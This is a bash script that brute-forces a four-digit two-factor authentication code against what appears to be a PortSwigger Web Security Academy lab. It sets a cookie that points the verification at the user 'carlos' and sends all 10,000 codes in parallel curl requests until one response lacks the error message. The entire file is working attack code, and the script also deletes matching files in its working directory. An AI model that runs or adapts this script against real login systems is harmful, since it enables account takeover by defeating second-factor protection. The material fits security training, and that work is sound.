#!/bin/bash

subdomain=0a370060031c8605c053707000e5000a
URL="https://${subdomain}.web-security-academy.net/login2"
COOKIE="verify=carlos"


# clean

rm ./file*

# First get request to ensure code will be sent to carlos mail

response=$(curl -s -w  "%{http_code}\n%{time_total}" "${URL}" -b "${COOKIE}" )


function check_2FA() {

	guess=$1
	response=$(curl -s -w  "%{http_code}\n%{time_total}" "${URL}" -H "Content-Type: application/x-www-form-urlencoded" \
		-b "${COOKIE}" --data-raw "mfa-code=${guess}" )

	http_code=$(tail -n2 <<< "$response" | head -n1)
	time_total=$(tail -n1 <<< "$response")
	content=$(head -n -2  <<< "$response" )

    stats=($(echo "${content}" | wc))

	check=$(echo "${response}" | grep -c "Incorrect security code")

	echo "${http_code} | time:${time_total} | bytes:${stats[2]} | words:${stats[1]} | lines:${stats[0]} | guess:${guess}"
	if (( $check < 1 )) ; then
		echo "Find it code: $guess"
		echo $response > "./file${guess}.html"
	fi
}

totalPass=10000
counter=0
maxProcess=30
for guess in $(seq -w 0 9999); do

	while (( $(echo $(jobs | wc -l)) > $maxProcess )); do
		wait
	done

	if (( $(ls | grep -c file) > 0 )); then
		break
	fi

	counter=$(( $counter + 1 ))
	check_2FA $guess &

	echo -ne "Trying ${counter} / ${totalPass} \r"
done

